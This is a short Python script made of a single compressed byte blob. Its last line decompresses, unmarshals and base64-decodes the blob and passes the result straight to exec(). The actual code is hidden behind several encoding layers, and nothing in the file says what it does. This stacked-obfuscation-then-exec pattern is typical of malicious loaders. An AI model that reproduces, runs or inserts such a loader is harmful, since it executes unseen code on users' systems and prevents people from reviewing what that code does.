import base64
import marshal
import zlib


mmm = b'x\x9c\xe5Z\xc9v\xab\xc8\xb2\xad\xff\xb9\x13@\xd6\xa9\xc3\xe0\r\x04\x16\x08\xd4\x19\x10\x8d\x98\t\xb0\x01\x91 \xceQ\x0b\x7f{\xff\xe4F&\x8d\xe8$\xdbu\xab\xd6zo\xbdA.[@fDFF\xec\xd8\x11\xf0\xef?\xe8?\xfe\x902N\xdf\x89(\x97\xc4 p3.p\xc4\xab\xef\x89\x01\x92fFn[\x92\xef\xc4\x06\xb2gK\x7fg\xbe\xf8\x9e\xb5J\x9d\xd8-\xefs\x99\xc3x\xd9\xd6\xa4\xe6;\x93\xbe:#\x99\x92f2r-\x03\xb9#5\xe7c\x1b\xeeS\xbe\x1d\x0b{\xdb\x94/\x0es\xf4\xeb\xe7\xa64<\xb3\nlF?J\xd3\xd5qg\x1ag\x8f\xbf\xfa\x86\x18d\xb6)D\xc6\x0c]m%M\x1d\x8b\xbb\xb8\x89\x82\xe5\x91\xeb;s\x9c\xf01:\xb9"\x9by<\xf7\xcbe\xd8s\xe37\x05\xeb\xa3\xc6\xef\xfc\xddZ\xdeu\x13\xd9\x9c\xf7\xd3\xbd#\n9\xecs\xe3\x8a\xc2I\x89Yj\xed\x1f|\x89\x9f\xf8\xb6h\xc4\x92\xc0~\x80\x8c\xd4\x83\xbf\xf3\xd9\n9\xe26\xad\xee\x93\x01{\x86\xfb\xd4\x9c\x97N\x0b\x8d\xf2\r\xc68n\x19\xf6dk\x1c\xe5d\x9c\xb85Wh\x1b\xb3\x97\x1d\xbd\xba\x82]|x\xe6$\x85\xd1\xbc\x9e\xcfO\xf6\x92x\xbb\xd8\x0c:\xf3a}\r\xf6\xc7\xfe\xb6\xcd\xf1\x07\xe8D\xed\xf8\t+\xcdV\x94\x1b\x06\xa9\x93p\xb4\xc7\xfb\xa1A\xee\xbf\xf8j\x8c\x8e\xf6\x06\xf4\t\xa3\xb49\xdf\xc6\xd75\x98\'\xb2Wx\xee\xd0^\xef\x1a\xba\xa1\x94\xf6\xe5\xbd\xf8oZa\xc3E|\xbblM\xe5P\xac\xd3\xd4\x97\xcbm\xf3\x16/\xe2\xea\x8c@F}^\x01\xe50\'\xe4\xf4\xf6\xb7\xba8\xb1\x9d\xda\xd7\xa6\xdd\x88-\xcf`\xab3\xc8H\xa4W\xca\x7f\xcf\xe4\x93\xcbx\xa2\x1b#\xe4\xc4j.\xedS\xb0\xdf-\xb7\xb5ks\xbd\xa1\x11:\xd6*QG\xf2\xc5\xb3\xb8o\xce3\x8e\x9e\x88\xae\x8eh\xfc5\xb9\xb1\x00g-\xfdPc\xe1\xe8\x82\xef6m:8\xe2q\xe0\x98\xc6qg\xad(\x90\xe3X_\x90\xb13\x95p\x1d\xd9\x81\x036[L\x0e\xcf\xd7\xe7\xe5\xd4\x16o\xa9;\x829\xe8\xe4}\xe1\xf9\x93m\xad\xf2\xad\xe9!\xe2K\xb0\x17\x93\xa6>\xdfG\x02q-\x1a\x81\xc7K?\x96_\xd8\x03\xc4\xd2qkE\xe1z\xcf\xb1\xad\xb53.\xb1-\xc5wg\xf2\xa5\xf05\x0e\xf0\xc4\xbe\xb4|\xd3D\x11\xf6\x8f\xd2G\xcf6c@\xbc\xc9{kD\xf0(\x9c+M\xbf*0\n\xfc\xb8\xe3\xa7\xe3\xd8\xb6\xd4\xfdN\xc0\xf7e\x19\xcb\x98\xcf\x8c\xd4\xe6\x91\x83\xd7\xb7\x94\x81\x98\x16\xb7\xa1>2\xf6[\x06\xe6$\xc6\xd1\x99E\xbe#\xb2\t\xc8\x8f$\x11\x9d%\x01\xe3\x9d\x9d:\xa2\xeeo\xb0\x1f@\x1c\xbe\x17:\x9d\x89_X\x14\xd6\xad\x13\x0b\xec\x15\xfc\xed\xe2$K\x1f01\x00,\xeb\xc7\x16ZQ[K\xa66#\x8c_\xec\xd9\xcd\xfcV\xac\xba\x801v8\xde\xd8&\x8e+\xf5\xcd\x9d\xa9\xa9\xc3\x8c\xf39?\x14\xa7\x1e\xf2\x88\x9e\xf4\x15p\xa3\xb5\xce\xce\xdcVk\xeda~\xbc3=\xa7\xf0O=\xb46\x87\xde\x99\x96\xcf\xc2\xbaB\xb6e\x82\xf5\x16\xb0\xb5#\x13a\x1fm\xe1cS\x97\x04\xb0\xd0\x92\xf7\xbb)\x9a\xe2y\x1d?\xc81\xfeb\x9c\xc3{ocS\x81\xf5n\x06X#\x9c\xbc\xfff\x0fv\xccf\x95\x8f\xe0\xfc5<\xb7\x8cOD\xfd\x18\x8e\x038\x17\xc8k[S\xcd\x17\xb1p\x8588\xdb\x80}\xe55\x9c\x0f\xcfU\xde\x9a\xcf\xe0\x8c\xf1\x19\xbc\xd2\x95\r \x0f\xd0\x1f \x83\xc4\xdc\x82\xe7\xf0\xfd\xfcM\x0b\x1c\xc8\xa5\xc8ET:o\xe1mc\x88(\x96\xc4\xf1\xc5\xbbcp\x81\xab\xf4q\x18\xc7\x1e\xea\xdf>Olw\x8b\x81\xfc\xcb\x08\x89\xad\x054\\\xcfZ1\x05\xb1\x0b\xd8\xd6_K\xb4/n\xc8A\x0cA\xcc\x86}\x9dv\xa6\xfa\xff\xd9\x8e`\x97Vl\xa4\xf6\x80\x8d\xbe,\xaf\xb0ui\x1b\xa5\xe0^U\\\xe4}?/pL=\xb8\xb1\x11\xd8\xfc8\xf7D!\xeb\xc6\xff\xdf\xb0\xee/\x07xK\x17w\x80c\x9dm+H1O\xd1\x05\xf9M\xa5en\xa3q\xaf\x1b\x8aV6SCW5\xe0\x1e\x15F@\xdc\x17\xba\x01\xaf#8\xf6R\xac%\xaa\x08\xec\xb5!\xf7\xa65f\x1e\n[G-\xfb@\xee\x00^\xa4\x1c\xa4\xfd\x140\x19xE\xac\xf8\x1b\xf0\x8b\xe2\x1c\n\x1eV\xd8V\xe9\xe4\x8a\x9a\xbbe\x0b\x90\x05\xfc\xa8\xc0\xf5\xa9\x979#\xe3\xda\xe6i\xdc\x15\xd68\xe3=-\xb3\x17\x7fS\x9f\x9b\xee\xab\t\xe4\\\x98\x0b\xf8t\x90\x84\xd26\xb0\x8e\x9dM\xd2\xce\x1a#\xe0\xd58\xc7\xe9nb\x0c\xe1\xe4~\x07\x9c\xb4\xe4a\xb97\x93\x0e\xa0\xdf\xd5\x83\xe4$\xc5\xab\x83\xc3\xc0\xbd\x01\xaew\xf7ixf\x04\xfb\x0f\xc7\xa9\xcb\xa8)pJ\xd8[\xf4(\xf6\x9a\xb2\x88\xfd\x00\xd3/`\xdfs\xcbF\x8d\x81\xb1\xb6zFz}\xf1\x97\x10s\xd8\xd6\xf7kWVz]>\x8d\x95m\x82\xfd\xec8\xc4\'\x1b1\x01\\\xae\xb6\xa9\xec\xe1\xdco\xccd\x1as\x03\xf0\x89\xbb\xde\x1b\xca_jE\xce\x91\xa6\x05?\x1a\xc8\x93\rl\x07\xec\xa0\x8a\xb3\xfdt\xdd\xf0[\xeb\xd2\x0e\xf8\xae+\xde\xd0\x97\xf5\xce:\xeb7\xe2\xa1\xc8\xeb\x8a\xef\x94\xf9\xbf\x90\xcdE6\xd8_g\x0c,7\xbas\x83\x80\xd8o\xde\xcau\r_\xd5^H\r\x05{Nv<Gr\xf6C\xbf\x0e[\xcf\xbe\x82\x1c\x06\xb8R\xbe\xb5H\\\xfa\x9a\xde\x8d\x1f\x0f\xfc\xf3\x86\xc0\xe73\xcf\x1c\xca\x0f\x95?\xf6\xeb\x17\xec3\xf8\xde:\x9c\x84C8\xdd\xf4\xb5E\x8cr\x88\xa7d\x07q0\x1f\xc8\xe9=Y"\xdeOP\xd9\xbb\x1f+w<\xbe\x9fI8\xb9J\xa2\x00\xf9\xa7q\r\xceo\xb9\x7f \xafX#\xc4\xb1\xbe{R\xd7\x98\x99|&6G\x14\x8e3\x12\xf7\xedX\x9d\xb0o\xda\xe4V\xe6X\xbf\xac#\x9e\xc6\x07\xae\x07,\\\xdb\x15v\xef\xc4%\x051(\xf96\xa9_\xb8\xa2\x8e\xa99\xe8\x12c{\xea>\xf0-\xcc\xabu\xe0\xe1PcS\xc3\xb5n\xfb\xbc\xf1zx\x8e$\xd6\xb5{\xcfVN\x85\xc3\x06{\x05?:\xe0\x98\x00\xde\x9b\xcd\xe1\x8c\xdc\x19\xe1\xf1\x80\xbb7\xb4\x1d)\xfe\xbb\xc9\xd2\x90\x8b\xa0\x06t\x1f\xd6\xb5w\xacc\xf3E\xc2\x05\x9e\xe8\x9f\x81c\xc4X\xafy\xad\x87Q\xd6\xb9\x0f\xb1\x8f<\x8fu\x01;\xc0\x19\x04u\rd\x8d\xc8\x9aG)\x81\xbaB\x1b\x17\xdc\x83\x8f\xce\xee\x88;b\xff\x93\xd0\xed\xdc\xa9\xdf{\xb9\x14r\x1fE\xf2\x88Hj\x83\xafp\x87&\x96T{\x10\x89\x8e\x88:o-\xee\x8a1\x058\x10z\x9f)\x8f\xfc\xb9\xef\x8b\xc5\xf5\x07\x9c\xbc\x93;\xa3\xa2\x8eqb\xb6\xd0}F\xec\x10<\xcd_!\xaeg\x80\x93\xf1\\f[\x1cp{\xa5_3\xc4\x06\xe8.P\x03\xe7\xae\x95s\xc0\x8f\xa4\xb4\x9fsH|V\xeb\xe23\x8e\xc0>\x98S\xa4\x0f\xf7\xd2\x90E\xf2\xfa\xac\xaaQ\x9f\xf0\xc0\xfa\x99\xc9\xbf\xa4\xd7\xc9\xf7\xce\xaa\xae\x81\x0b\xac\xaf\xe4\x7f3\xff=\xb2)\xc4\xe4-x\xef\xdb\xa5\xb8\xae\xf51U-j\xecg\xf6,\xe7~\x89\x1f\xdc\xe5\x14xZ\xfe\xfe\x87l\x19\xab\x807\xc2\xb8\xc4\xc9\x07{o\xca\x93ql\xfen\xe7M\\\x97\xfa\x84\xbf\x969\x8c`o\x13\xe3@.\xd4\t\xab\x03\xa9\xd7\xb5\xc1\xdc\t>\xb7\xba\xe2z\x1a0\xab\xa8_\xe0lM\x9a\xea`2\xa9\x81?H\xad1\x90\xdf\xf4R\x8eD\xfa\rRq&\x05\x0f8;\x80u\x9fr\x932\x1f\xf4\xb1\xb2\xd8c\xd1\xeb\x9a\xd4}\x87.N\x82/B=\x02\xfc\x00\xd6\x18\xe8\x85T\xfa\x8b\xceH6p\xbdW\xf0\x88\xe6\x9e\xae\xb7%\x1f\x91\xdcB0\xa1\x9f\xd7p\xafn\xe6\xc6\x80\xd9\xb3%\xe4\xa3\x92\xcf\xd4\xcf\xdd0\x0f\xa2\xee5?`cT\xedoPV\xd3\xbe\xb13\x92\xfc\xe2\x1e\xa9-\xefg2\x90\xff\xbf\xac\xe3C\xee\x80}\xb7\xe8\xdb\xc0y\x7f\xd8%\x87{\x843E.\x04_\x1fqP\x93\xac\x90\xc5\x90~[\x03\xa7\xc9Z\x03y\xebA\x1d\xfd\xc0\xef\x1a5\xf1@M\x8es\xe0\r\xe7\xae\xde\xbc\xb9F8\xc5u\xa0\xbe\xa8\xb9\xde&\xfe\xe9W\xfb\xc4y\xcb\xc3\x7f\xa1.{^\x1b7z\xac\x10\xa7%\xc7h\xafY\xfa\xa5\r6\x07\x0e\x1b\x0c\xe5J\xf0M\xca\xb3\xe4su^\xed\x98l\xd7\xa8D\xc6P/\xaa\xca[H=\xec\xac%\xf0\x1f<\x97\x0b\xb7\xe6\xea7\xec\x87\xbcg\xa8\xd6]\x87CgQ\xf4.\xa0\xdeF\xef\xfc\xb5\xe9k\xc8I\x0c\xe0\x032\xe4?\xfdp\x8f#\xe3\xc3\x11Q\xee=\xc6\xcb\xd2\x0eA\xb9\xe6\xe4\xb7\xf4:=J\xe26\x1c\xe8\tv\xe7~R\x17\x96\xb9\xe3\xce\xf1\xba\xb8\x80\xfb\x07\x01\x8eu\x1cs\xe4\x1d\r\xeca\x1b\x1b\x19\xd4\xea\x17\xc8\xe5\xe9\x969>\xc8\x0b\xf7\x18*\xd6\xacxi\xf4\xa5\x9c[\xd8\xf21\xf7\x96x\xe0\xd0Oq\xbc\xc9\x85\x89\xfd\x0b\x1f\x9e\xc9P[z\xc0\xe9\x1e\xf9x\xf4\\\xa7\x1a\xa7;>\x8c\xcf\xc0,\xfa\xe3\x966\x0e\xdc\x19\x87\xfb\x02\xfds\x16N\xe5\x1e\xc6\xde#\x9bur\xeb\xdf\xd2K\x1a\xf0\xa7XB\xc6F5$_\xd1\xd5\xa9\xaa\x03_\x9a\x9d\xba\xb2\x92\xc6\xbe\x12\x10{Z\x1aT\xe5o\xa4\xa7\xf3N\x9f\x08\x86,\x8a\xde\xe8\xa7}P\x99\xb9\xf7Ae\x9a\xf6>\xb4\x81\x18\x1a\xd6\xfbK\xbe\xfc\xc8\x8fl\x1c\xbf=\xff\xf6C\xc5T#\\\x9f9#\xf5\x80u\xae\xb0\xeb-\xc3v2\xf0\xfb;\x88[\x15\xc70\xc9\x1d\xefPw@\x8d\x80\xfd\x7f\xecb^[^w\xe2\x9fe.\x8e\xce\x8e\xc8\x8e`\xad\xc3\xe7\xe7\xdb\xf7\xd7ROV\xe2\x01\xc7\x9e\xd6\x88\xc3\xa3\xc2\xc0\xaf\xd9\xf4\x1e\xa3\x80\x01\x08b\x99\xf4\x10\xa4P\xfa\xa2/5\x06\xe4-ofdu\xbf\xb6\xce\xcf\xc4/\xbe`\x0b\x9c\xa7T\xda\x8d_\x9e\xd5\xc5Ok\x8e\xbe\x8f\xfba\x8dWE\xee\xa9q@\xaa\xfd\xae\xcd\xdf4]\x19\xee\x05\x96\xf7\xcbwC\xfd>Z\x041\x93\xd8\xc8MV\x01\xe9)\x86\x9c\xac\xbe\x0e\xf0\xa7\x1e?CQ\x81\xff\xb2\xd7\xc8\xcb\x1d\x1e\xf37\xf6{\x1b\xef\xa0\x14\x8a]\x1b\x91\xa1\xe9\x94\xa0k:\xbb\x96\xa6\xc2T\x9d\x1a\xd3u\xc8\xfd\xd9\xde\xaf\xcc\x16\xb5\xdb\xc9\xd9\x99J\x11\xe3"*z\x9a=n\xe4U\xef\t\x01/hv(O{L@jB\xd2\xc3z\xd2w\xf9j\xcc* \xdb\x833v\x19\x81\xf4\x1e\xa4)\x9a\xfe\x93\xf1\xdb\x8b\x97\xf8%\xfc\x8c\xd3\x91\xd8x\xf0\xccw\xe3\xef\x11\xcf\xc1\xbe\xdb\xee\xa3\xd5r\xeb>\rp\xcb\xc0Q\x1a\xdf!\xcc\xda\xef;\xca\xfe\xcc\xb1\xc0p\xf9\xc3a\xe4_p\x0eT\xa7\x96!6\xdbi\x05\x87\xde\x9a\xe3\xa4\xaay\x9a>Y\xd7\xcd\x88\x1a\xc8\xa9\xa5\xdd\xef\xfd\xf4\xc1w=\xf5}\x9d\xf4\x11\x1es\xed\x81\xfa\x00\xe7\xdfz\xfe\x86^U\xbd\x98{?GO?\x7f\x8f\xdd\xd2\xb9z\x87\xf4\x01q\xc0\x16\xef\x83\xd8\xcb6Nq\x9f\xe9L\xde\'\x13\xce\xff\xb8WWr[\x923-\x86\rw\xb1\xb1\xf7\xf8O\xdfs\xb7\xe3\xa7|\x8fb\x8d\x88\x0f\xb3\xadoY\xb4\xb1\xa1S\x86\xf6\x17\xf8\xb6^\xeeM\x7f\xb78\xb4\x88<mC\x1b\xca\x00\xa7l\xf0\x87\x95\xb0\x89Ty\x13\xb9\xfeF76\x80#3\x15\xd6\xd9d\xdc\x9f]\xdb\x14\xdf3\x0cbW\xc114\xaf\xaeM\xdbsU\xc0\x1e\xf0\xa1\xd9)\x9d\xe7\xc20\x9e\x88\x08\xe6\x8fs\xc0>\xe4\xf2}?\xac\xbe\x11\xb0\xb4\x08\xe0#=:\x8cw\xc1\xb8\x02q\x16Z\xaf\x93|I\x1fo\xeb<b\x9c\xf7\xb9\x19\xae?\x19\x93\xd4]\xbe.s3\x9f\xfe\xb9\xde\xd8\xa7\x97t\'\xc1\x98\x96\x7f\xbb\x83\\\xaf\xf4l\xc8\xba\x81,k\xff\xaf\xb9\xf9{\xfd\xd9\xe0\xc7\x91wN\x99\x1f\x89\x7f\xb6g!\xfa\x95?\x1f/?\xe7\xbd=\t\xd7\xeb2_9\xcb\xcdq\xbc4G!\xfa\x9dw\xc6\xb5\xa9\x1b\xedh\x94oe\x93\xd3\xc2\xf8\t\xe3>w\x85\xe7\xee\x9c\x10\xd9\xaf0\\\xff%\xd5\x960&0\x14i=\xd7\x7f\xc3\x1e\xe1\xff#\xfco\xa4\x04\xbf\xf0s\x9b\xf2\xf9\x8f\xf2\x7f\xd7\xe7Qc\xcd\x18\xd6<\xf8M\xf9\x99\xa3q\r\x1b\x1b\'+\xa3?\xf07P\xa0\x8f\xbf\xd0\xe8\x0f\x8bn\xec\x87\xc1:\xbd\x96zQX\xbe[\xea\x14a\x9d\x10\x8c\x08\xc6\x1eFL\xf4\x99\xfa\xe5\xfdr\x98\xf0\xdb\xdcc\x9d\x0f0~\xbd\xcf\rt\xed\x9fq\xe7\xec\xcc\xe3\xb93\x9a{2\xa9\xd3B\x9b\x80\xae\xdc\x07\xd4)\xa7\xcey\x10\x19\xf1ynDX\x9f\x85\x82\xf5\xa1\x88\xadd\xb0\x8f\xec\xfbX\x97_Ze\xbf\x03\xf9M\x9e\x87\xbfI\xcb6\xf6\xa9o\xcb\xfd\'\xc3\xaf\xe2\xb8\xb1\x8e|\xba\xfe:\xe2\xef\xcc\xea\xf1\x92fI\xf3\xf7\xc2\x9d\xff\xd9\x96\x85m]\xf8\xb9T\xc5\xc6\x00V5\xf6\x9e;\xb0\'=\x16\x18\xc8\x1b\xfa\x16\xf7\xd8\xba\xba\xd7\xbe\xf2\x7fq\xb8\xdd\xb8\x03j\xd5\xb2\xd7/Ih\xfa\x08\xcdy\x96z\xc09\xb0y}\xc9P?\xfa\xe7c\x9c\x94\x04\xf0Z\x0c\x90{\x9eO\x0e\x11\xad-\x90\xcc\x19Q\xd4y\xce>u\xed\x0f\xbe\xad\xf6\xed,\xb4\xe6\xcc\xc3\xf6\x1a*\x83(mf\x84\xed\xb5W\xa7u\xd8\xd5\xcb.|\x9b\xa1|\x05\xeaj/F\x14>\xd7z?"\xe5\xb7l\xa2=\xcai$.\xbfe\xbf%C\xcbN\xb2\x02y\xf8\xbbP\xfa\x13=\x85ROz\xb23\x85\x93\x8b}\xd0R\x83\xady\xf4\xbf\xa5+\xc4_\xa4t\xb1\xc1T\x1b\xf3F\x8ev\xf0[\xbfu\xc8\xc1\xc03;\xb1\x909\x9bC\xfbw\xb1\xd7\xe2\xfc\xa6\x88\x92GK\xe0FB\x049\x93\xf0$;1\xceR\x1d\xfb\xdc\xa9\xe5K\x10\x8b\x9f\x9f\xf9\xef\xff\x051\xf2W\x07\x05\x99Z\xc2\xb9\xfb\xe2f\xe3\xfc\x1d\xea7\xdb\xa4\x0e2\xb3:\xba\x99[\xf4iG\xcb\x92c\x90\x1ee\xe2$JR\xf1\t\xfc\x1c\xae\xa7\xe4\x0c\xf2\x7fR\xd5?\xf8\xdb\xd8\x9f)\xacIkP\xc3\x19U\xbf\xfd\xde\xfb*m\x1d\xe5\xeb\\\x80s\x01^C\xb1KI\xc0=\x13y\xad\xe8\xb4\xb0\xae\xe3&\xca\xc83!\xe1\x17\xf7\x9e\x12y\x97r\xffN\x99|3\xc7\xfb\xc9n\xa6R\xeel\xf9c\x91\xb1\x11p)\x06\xb8K\xe20l\x02\xfc\x16s\xc6\xd3bd\xec\xdf\x18\xe3\x85|[\xfcJG\xce\xc8\xc35I`\xf3\xc0g^\xa9\x9b&\xba\xb7\x95`Xk\x9d\x069\xb2\xbd\x9az\x96\xabK\xb4\x9bos\xd3\\\x9d\x9c\xe8\x96\xaf6\xf6\xf9}?M\xe6JJ\xa9\xa2\x01q\x82\x8e\xe4;\xb7F\x7fy\x11\xa7\xb9\xc3\xbc@\xcd\x90\xd2\x9b\xd2vP\x17M\xa1\x0e\x0fv\xc0\t\xa1\x96#<U\xa6\xa9\xb9\'\xb2\x17G\xe0\x02\x17\xfc\x12j\xdf\xfb\x9a\xc0\xdf\\\xf2\x9d\xb3\xe7\xf11\x8a\xe73\x03\xe2\x92#\xbd\xff\xb7\r]\xae\xfb\xa8\xb7Y\xd63u\xcf\xf5F\x9511\x06\xbf\xbd\x01\x0f \xebT\xdc\x11j9\rj\xe6\x83\xc7O\x80\x13H)\x9e\xfbl]O\x87\xb3\xbc\xeb\\\xbfC\xa9e\xe4X\xc6\xc47\xa6\xec\xdb\x86\xe7\x14\xc5Xm\x0c\x8a\xd5p\xdd^?\xb3\xc7\xcf<\xefQ\x81\xff\x1d\x1a\xb2\xd87K\xbd8\xccM\xd9B\xbd\x01u\xd3S\x1d\x9f\xd4\x1au\x0f\xc3\x9a\xa9\x95\x9f\xddJ_\xb4\x9d\x11\xeei\x08\x99\x8d\xfb\x10\xe6j\x8fk\x9b\xe6\xb7\xa4\xe5\xf7V\xd8f:\xf8\xd6Q\xe2\xe9\x0f\xf0O_\xfaV\xbds\x1f8\xbe\xdc\x11\xca=\xd18\xcdyo\xef\xcc\x96I\xfd\xbe\xbc\xec\xfd\xe1\xdaUf\xc6\x94\\}\x83\x82\x9f\xc3\xfd\xe3\xd0\xfdb\x8f\xef\x91\r\x02\xc2\xd9\xbf\xd5Ok\x9f\x8fo\xd1,\xa9\xc1,\xfagQc#\x16j^!u\xe0\xef_\xe9\xb3}i\x08\xa4\xb6\xe6\x9d\x11\xa9\xcb\xff\xe7?\x0e\x87|\x0c'
exec(base64.b64decode(marshal.loads(zlib.decompress(mmm))))